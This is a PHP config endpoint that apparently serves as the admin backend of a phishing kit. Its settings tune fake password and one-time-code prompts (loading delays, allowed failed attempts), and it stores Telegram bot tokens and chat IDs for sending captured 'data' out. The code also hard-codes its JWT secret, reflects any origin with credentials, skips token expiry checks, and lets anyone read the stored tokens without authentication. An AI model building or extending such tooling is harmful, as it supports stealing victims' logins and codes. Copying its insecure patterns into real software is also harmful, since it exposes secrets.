<?php
header('Access-Control-Allow-Origin: ' . (isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : 'http://localhost:5173'));
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Access-Control-Allow-Credentials: true');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('HTTP/1.1 204 No Content');
    exit(0);
}

define('SECRET_KEY', 'ovf_tank');
define('CONFIG_FILE', '../../config.json');
define('DEFAULT_CONFIG', json_encode([
    'settings' => [
        'code_loading_time' => 15000,
        'max_failed_code_attempts' => 3,
        'max_failed_password_attempts' => 2,
        'page_loading_time' => 5000,
        'password_loading_time' => 10000,
        'code_input_enabled' => true,
    ],
    'telegram' => [
        'notification_chatid' => '',
        'notification_token' => '',
        'data_chatid' => '',
        'data_token' => '',
    ],
]));

function ensureConfigFile() {
    if (!file_exists(CONFIG_FILE)) {
        file_put_contents(CONFIG_FILE, DEFAULT_CONFIG);
    }
}
function verifyJwt($token) {
    try {
        $tokenParts = explode('.', $token);
        if (count($tokenParts) != 3) {
            return false;
        }

        $signature = $tokenParts[2];
        $expectedSignature = hash_hmac('sha256', $tokenParts[0] . "." . $tokenParts[1], SECRET_KEY, true);
        $expectedSignature = str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($expectedSignature));

        return hash_equals($signature, $expectedSignature);
    } catch (Exception $e) {
        return false;
    }
}

function checkToken() {
    $headers = getallheaders();
    if (!isset($headers['Authorization'])) {
        http_response_code(403);
        echo json_encode(['message' => 'Token is missing!']);
        exit;
    }

    $token = explode(' ', $headers['Authorization'])[1];
    if (!verifyJwt($token)) {
        http_response_code(401);
        echo json_encode(['message' => 'Token is invalid!']);
        exit;
    }
}

ensureConfigFile();

// Handle GET request
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    try {
        $config = file_get_contents(CONFIG_FILE);
        echo $config;
    } catch (Exception $e) {
        http_response_code(500);
        echo json_encode(['message' => 'Error reading config file', 'error' => $e->getMessage()]);
    }
}

// Handle POST request
elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
    checkToken();

    try {
        $new_config = json_decode(file_get_contents('php://input'), true);
        $default_config = json_decode(DEFAULT_CONFIG, true);

        // Validate config structure
        if (!isset($new_config['settings']) || !isset($new_config['telegram'])) {
            http_response_code(400);
            echo json_encode(['message' => 'Invalid config structure']);
            exit;
        }

        // Validate settings
        foreach ($default_config['settings'] as $key => $value) {
            if (!isset($new_config['settings'][$key])) {
                http_response_code(400);
                echo json_encode(['message' => 'Invalid settings structure']);
                exit;
            }
        }

        // Validate telegram
        foreach ($default_config['telegram'] as $key => $value) {
            if (!isset($new_config['telegram'][$key])) {
                http_response_code(400);
                echo json_encode(['message' => 'Invalid telegram structure']);
                exit;
            }
        }

        file_put_contents(CONFIG_FILE, json_encode($new_config, JSON_PRETTY_PRINT));
        echo json_encode(['message' => 'Config updated successfully']);
    } catch (Exception $e) {
        http_response_code(500);
        echo json_encode(['message' => 'Error writing config file', 'error' => $e->getMessage()]);
    }
}
?>
